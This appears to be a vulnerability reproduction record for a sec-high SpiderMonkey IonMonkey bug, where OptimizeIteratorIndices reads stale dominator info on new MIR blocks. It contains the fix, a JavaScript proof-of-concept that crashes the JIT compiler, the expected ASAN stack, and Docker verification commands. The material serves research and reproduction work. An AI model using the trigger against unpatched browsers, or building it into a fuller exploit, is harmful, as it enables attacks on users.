# Bugzilla 2029065

**Title:** IonMonkey `OptimizeIteratorIndices` dominator query on freshly-created MIR blocks
**Severity:** sec-high (bug access-restricted; tagged sec-high in mozilla-central; follow-up to Bug 2013543)
**Component:** SpiderMonkey — IonMonkey — `js/src/jit/IonAnalysis.cpp` (`OptimizeIteratorIndices`)
**Fix commit:** `5cfc09e7ce19a151df5651a24ebd250632aac10f`
**Vulnerable revision:** `5cfc09e7ce19a151df5651a24ebd250632aac10f~1`

## Summary

Follow-up to Bug 2013543. After that earlier fix, `OptimizeIteratorIndices`
still queried `dominates()` on freshly-created MIR blocks whose
`MBasicBlock` dominator info had not yet been computed (or had been
invalidated by a prior rewrite in the same pass). Calling
`MBasicBlock::dominates` / `numDominated` on such a block dereferences a
stale dominator pointer, producing garbage dominance results that trip
`MOZ_RELEASE_ASSERT` in `numDominated()`.

## Fix

```cpp
// js/src/jit/IonAnalysis.cpp — guard new blocks
if (block->hasNoDominatorInfo()) {
  continue;  // skip; dominator info will be recomputed after the pass
}
// ... existing dominance-based iterator sharing
```

Blocks that were freshly created by the same pass are skipped rather
than queried; their dominator info is recomputed later by
`AccountForCFGChanges`.

## Trigger (`poc.js`)

```js
function f(obj1, obj2) {
    let keys1 = Object.keys(obj1);
    let r = 0;
    for (let i = 0; i < keys1.length; i++) {
        r += obj1[keys1[i]];
        let keys2 = Object.keys(obj2);
        r += obj2[keys1[i]];
        r += obj2[keys1[i]];
        r += keys2.length;
    }
    return r;
}

let o1 = {a: 1, b: 2, c: 3};
let o2 = {a: 10, b: 20, c: 30};

for (let i = 0; i < 1000; i++) {
    f(o1, o2);
}
```

The inner loop executes enough `Object.keys` + indexed-load sequences
to make `OptimizeIteratorIndices` split and re-create blocks mid-pass.
When the pass then asks the fresh block for `numDominated`, the
uninitialised dominator tree crashes the compile.

## Expected crash

ASAN **SEGV / MOZ_CRASH** at
`js::jit::MBasicBlock::numDominated`
(`MIRGraph.h:539`) → `MBasicBlock::dominates` (`MIRGraph.h:150`) →
`OptimizeIteratorIndices` (`IonAnalysis.cpp:2234`), surfacing as
`MOZ_CrashSequence` SEGV from
`js::jit::CompileBackEnd` during Ion compilation.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:2029065 spidermonkey/2029065
bash spidermonkey/crash_check.sh 2029065
```

Expected: `CONFIMRED: ASAN_CRASH`.
